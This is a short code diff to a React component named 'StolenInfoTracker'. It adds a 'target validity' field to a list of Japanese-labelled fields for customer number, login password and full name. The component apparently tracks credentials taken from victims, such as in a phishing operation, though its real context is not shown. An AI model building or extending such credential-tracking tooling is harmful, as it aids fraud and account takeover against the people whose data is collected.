@@ -8,6 +8,7 @@ export default function StolenInfoTracker() {
   const [isExpanded, setIsExpanded] = useState(true);
 
   const infoKeys = [
+    { key: 'activeTarget', label: 'ターゲットの有効性' },
     { key: 'customerNumber', label: 'お客様番号' },
     { key: 'loginPassword', label: 'ログインパスワード' },
     { key: 'fullName', label: '氏名' },
